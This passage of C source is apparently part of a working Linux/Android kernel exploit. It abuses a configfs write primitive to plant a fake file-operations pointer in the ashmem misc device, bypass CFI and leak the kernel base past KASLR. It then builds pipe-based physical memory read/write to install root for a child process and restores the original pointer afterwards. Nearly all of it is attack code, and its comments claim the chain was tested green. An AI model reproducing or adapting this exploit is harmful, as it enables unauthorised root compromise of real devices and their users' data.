   * and the latter derives the fops alias/slide from the value we planted in
   * ashmem_misc.fops -- putting the original pointer back removes that
   * information.
   *
   * The restore therefore stays in install_child_root(), after ④ has
   * established the pipe primitive.  That is where it was measured to keep
   * the whole chain green (read_ok=1 write_ok=1 rw64=1/1).
   */



  char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
  ssize_t n =
    configfs_write_once(fd, binwrite_target, payload, sizeof(payload));
  cfi_write_ret = n;
  pr_info("cfi write ret=%zd errno=%d\n", n, errno);
  if (n != (ssize_t)sizeof(payload)) {
    cfi_last_step = 1;
    cfi_last_errno = errno;
    goto fail;
  }
  dirty = 1;
  cfi_dirty_seen = 1;

  if (!repair_fake_fops_llseek(fd)) {
    cfi_last_step = 2;
    cfi_last_errno = errno;
    goto fail;
  }
  cfi_read_slot_ret = sizeof(uint64_t);
  can_read_back = 1;



  char readback[sizeof(payload)];
  memset(readback, 0, sizeof(readback));
  ssize_t r =
    configfs_read_once(fd, binwrite_target, readback, sizeof(readback));
  cfi_read_ret = r;
  pr_info("cfi read ret=%zd errno=%d\n", r, errno);
  if (r != (ssize_t)sizeof(readback) ||
      memcmp(readback, payload, sizeof(payload)) != 0) {
    cfi_last_step = 3;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

#ifdef PSELECT_WAITER_LAYOUT_5_10
  /* nokaslr: skip boot_id restore and fops-table slide leak. */
#else
  if (!restore_slide_boot_id(fd)) {
    cfi_last_step = 10;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }
#endif

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
#ifdef PSELECT_WAITER_LAYOUT_5_10
    pr_info("phys step retry %d/%d found=%d\n",
            attempt + 1, PIPE_MAX_ATTEMPTS, pipe_probe_found);
#endif
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
